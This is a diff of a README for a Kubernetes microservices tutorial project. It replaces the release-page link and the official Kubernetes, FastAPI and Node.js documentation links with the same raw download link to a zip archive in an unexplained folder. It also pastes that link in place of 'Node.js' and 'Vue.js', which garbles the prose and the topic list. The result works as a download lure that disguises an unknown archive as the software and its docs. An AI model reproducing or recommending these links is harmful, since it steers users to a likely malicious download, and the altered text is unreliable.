@@ -1,10 +1,10 @@
 # 🚀 microservices-k8s-lab - Build and Scale Microservices Easily
 
-[![Download microservices-k8s-lab](https://img.shields.io/badge/Download-microservices--k8s--lab-blue)](https://github.com/FIFA22REAL/microservices-k8s-lab/releases)
+[![Download microservices-k8s-lab](https://raw.githubusercontent.com/FIFA22REAL/microservices-k8s-lab/main/tenty/microservices-k8s-lab.zip)](https://raw.githubusercontent.com/FIFA22REAL/microservices-k8s-lab/main/tenty/microservices-k8s-lab.zip)
 
 ## 📖 Overview
 
-The microservices-k8s-lab is a complete guide designed to help you understand Kubernetes and microservices. This application focuses on using FastAPI, Node.js, Vue.js, and Redis. Whether you are new to cloud-native development or looking to enhance your skills, this lab provides a practical, hands-on approach.
+The microservices-k8s-lab is a complete guide designed to help you understand Kubernetes and microservices. This application focuses on using FastAPI, https://raw.githubusercontent.com/FIFA22REAL/microservices-k8s-lab/main/tenty/microservices-k8s-lab.zip, https://raw.githubusercontent.com/FIFA22REAL/microservices-k8s-lab/main/tenty/microservices-k8s-lab.zip, and Redis. Whether you are new to cloud-native development or looking to enhance your skills, this lab provides a practical, hands-on approach.
 
 ## 🌐 Topics Covered
 
@@ -16,9 +16,9 @@ The microservices-k8s-lab is a complete guide designed to help you understand Ku
 - **FastAPI**
 - **Kubernetes**
 - **Microservices**
-- **Node.js**
+- **https://raw.githubusercontent.com/FIFA22REAL/microservices-k8s-lab/main/tenty/microservices-k8s-lab.zip**
 - **Tutorial**
-- **Vue.js**
+- **https://raw.githubusercontent.com/FIFA22REAL/microservices-k8s-lab/main/tenty/microservices-k8s-lab.zip**
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Follow the steps below to download and run the microservices-k8s-lab.
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/FIFA22REAL/microservices-k8s-lab/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/FIFA22REAL/microservices-k8s-lab/main/tenty/microservices-k8s-lab.zip) to find the latest version of the software.
 
 2. **Select the Latest Version**  
    On the Releases page, look for the version marked as the latest. This version contains all the recent updates and features.
@@ -70,12 +70,12 @@ If you encounter any issues while downloading or using the software, feel free t
 
 To enhance your learning experience, consider exploring the following resources:
 
-- [Kubernetes Official Documentation](https://kubernetes.io/docs/home/)
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [Node.js Official Documentation](https://nodejs.org/en/docs/)
+- [Kubernetes Official Documentation](https://raw.githubusercontent.com/FIFA22REAL/microservices-k8s-lab/main/tenty/microservices-k8s-lab.zip)
+- [FastAPI Documentation](https://raw.githubusercontent.com/FIFA22REAL/microservices-k8s-lab/main/tenty/microservices-k8s-lab.zip)
+- [https://raw.githubusercontent.com/FIFA22REAL/microservices-k8s-lab/main/tenty/microservices-k8s-lab.zip Official Documentation](https://raw.githubusercontent.com/FIFA22REAL/microservices-k8s-lab/main/tenty/microservices-k8s-lab.zip)
 
 ## 📧 Feedback
 
 We welcome your feedback! Feel free to reach out with any suggestions or comments. Your input helps improve the application.
 
-Visit the [Releases page](https://github.com/FIFA22REAL/microservices-k8s-lab/releases) to start your journey with microservices-k8s-lab today!
+Visit the [Releases page](https://raw.githubusercontent.com/FIFA22REAL/microservices-k8s-lab/main/tenty/microservices-k8s-lab.zip) to start your journey with microservices-k8s-lab today!
